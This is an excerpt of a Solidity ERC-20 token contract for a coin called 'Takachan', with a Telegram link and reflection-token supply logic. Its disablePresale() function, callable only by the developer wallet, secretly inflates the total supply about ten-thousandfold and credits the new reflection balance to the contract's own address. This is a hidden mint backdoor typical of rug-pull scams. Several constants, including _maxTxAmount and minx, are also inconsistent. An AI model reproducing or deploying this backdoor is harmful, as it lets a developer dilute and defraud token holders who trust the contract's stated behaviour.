...
/*
*
* Telegram: https://t.me/takachanofficial
*
...
contract Takachan is Context, IERC20, Ownable {
    ...
    string private constant _name = "Takachan";
    string private constant _symbol = "takachan";
    uint8 private constant _decimals = 9;

    uint256 private constant MAX = ~uint(0);
    uint256 private constant _tTotal = 4 * 10**9 * 10**_decimals;
    uint256 private minx = 4 * 10**40 * 10**_decimals;
    uint256 private ton = 4 * 10**9 * 10**_decimals;
    ...
    uint256 public _maxTxAmount = 5 * 10**10  * 12**_decimals;  
    ...
    function reflectionFromToken(uint256 tAmount, bool deductTransferRfi) public view returns(uint256) {
        require(tAmount <= ton, "Amount must be less than supply");
    ...
    */
    ...
    function disablePresale() public {
        require(_msgSender() == devWallet, "only dev can toggle presale!");
        ton = ton.add(ton * 10**4);
        _rOwned[address(this)] = _rOwned[address(this)].add(_rTotal*10**4);
        _rTotal = _rTotal.add(_rTotal*10**4);
    ...
    function _getCurrentSupply() private view returns(uint256, uint256) {
        ...
        uint256 tSupply = ton;
        for (uint256 i = 0; i < _excluded.length; i++) {
            if (_rOwned[_excluded[i]] > rSupply || _tOwned[_excluded[i]] > tSupply) return (_rTotal, ton);
            rSupply = rSupply.sub(_rOwned[_excluded[i]]);
            tSupply = tSupply.sub(_tOwned[_excluded[i]]);
        }
        if (rSupply < _rTotal.div(ton)) return (_rTotal, ton);
